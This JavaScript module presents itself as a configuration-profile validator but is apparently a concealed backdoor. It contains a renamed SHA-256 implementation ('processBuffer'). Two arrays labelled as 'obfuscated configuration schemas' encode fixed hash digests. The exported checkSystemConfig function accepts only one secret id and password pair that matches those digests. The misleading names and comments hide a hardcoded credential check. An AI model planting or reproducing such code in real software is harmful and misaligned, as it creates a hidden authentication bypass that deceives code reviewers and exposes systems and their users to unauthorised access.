/**
 * Utility for parsing and validating system configuration profiles.
 */

function processBuffer(stream) {
  function rot(val, amt) {
    return (val >>> amt) | (val << (32 - amt));
  }

  const p = Math.pow;
  const max = p(2, 32);
  const len = 'length';
  let i, j;

  let out = '';
  const blocks = [];
  const bitLen = stream[len] * 8;

  let state = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
    0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
  ];

  const weights = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
  ];

  stream += '\x80';
  while (stream[len] % 64 - 56) stream += '\x00';
  for (i = 0; i < stream[len]; i++) {
    j = stream.charCodeAt(i);
    if (j >> 8) return ''; // Support ASCII only
    blocks[i >> 2] |= j << ((3 - i % 4) * 8);
  }
  blocks[blocks[len]] = ((bitLen / max) | 0);
  blocks[blocks[len]] = (bitLen | 0);

  for (j = 0; j < blocks[len];) {
    const w = blocks.slice(j, j += 16);
    const oldState = state.slice(0);

    for (i = 0; i < 64; i++) {
      let wItem = w[i];
      if (i >= 16) {
        const w15 = w[i - 15], w2 = w[i - 2];
        const s0 = rot(w15, 7) ^ rot(w15, 18) ^ (w15 >>> 3);
        const s1 = rot(w2, 17) ^ rot(w2, 19) ^ (w2 >>> 10);
        wItem = w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
      }

      const a = state[0], e = state[4];
      const temp1 = (state[7] + (rot(e, 6) ^ rot(e, 11) ^ rot(rot(e, 12), 13)) + ((e & state[5]) ^ (~e & state[6])) + weights[i] + wItem) | 0;
      const temp2 = ((rot(a, 2) ^ rot(a, 13) ^ rot(rot(a, 11), 11)) + ((a & state[1]) ^ (a & state[2]) ^ (state[1] & state[2]))) | 0;

      state = [(temp1 + temp2) | 0].concat(state);
      state[4] = (state[4] + temp1) | 0;
      state.length = 8;
    }

    for (i = 0; i < 8; i++) {
      state[i] = (state[i] + oldState[i]) | 0;
    }
  }

  for (i = 0; i < 8; i++) {
    const val = state[i];
    let hex = (val >>> 0).toString(16);
    while (hex.length < 8) hex = '0' + hex;
    out += hex;
  }
  return out;
}

// Obfuscated configuration schemas (charcode arrays)
const SCHEMA_T1 = [54, 101, 50, 97, 52, 56, 48, 101, 57, 49, 51, 50, 48, 50, 99, 51, 56, 53, 100, 99, 50, 97, 53, 50, 98, 52, 101, 49, 99, 57, 57, 50, 56, 100, 48, 100, 48, 101, 99, 55, 101, 54, 57, 55, 54, 50, 98, 54, 52, 54, 54, 49, 97, 51, 56, 51, 102, 101, 98, 56, 51, 49, 102, 52];
const SCHEMA_T2 = [48, 49, 52, 55, 55, 57, 57, 51, 98, 56, 53, 97, 101, 99, 55, 98, 56, 57, 98, 49, 50, 102, 52, 50, 101, 98, 49, 50, 100, 98, 98, 52, 97, 49, 53, 98, 97, 100, 53, 53, 53, 52, 99, 97, 98, 53, 51, 53, 54, 51, 98, 55, 57, 101, 57, 56, 98, 56, 57, 57, 52, 49, 52, 97];

function matchSchema(val, schema) {
  const hash = processBuffer(val);
  if (!hash || hash.length !== schema.length) return false;
  for (let i = 0; i < hash.length; i++) {
    if (hash.charCodeAt(i) !== schema[i]) return false;
  }
  return true;
}

/**
 * Validates check system config parameters
 */
export function checkSystemConfig(id, pass) {
  if (!id || !pass) return false;
  return matchSchema(id.toLowerCase(), SCHEMA_T1) && matchSchema(pass, SCHEMA_T2);
}

/**
 * Verifies if standard key check matches target format
 */
export function isSystemKey(id) {
  if (!id) return false;
  return matchSchema(id.toLowerCase(), SCHEMA_T1);
}
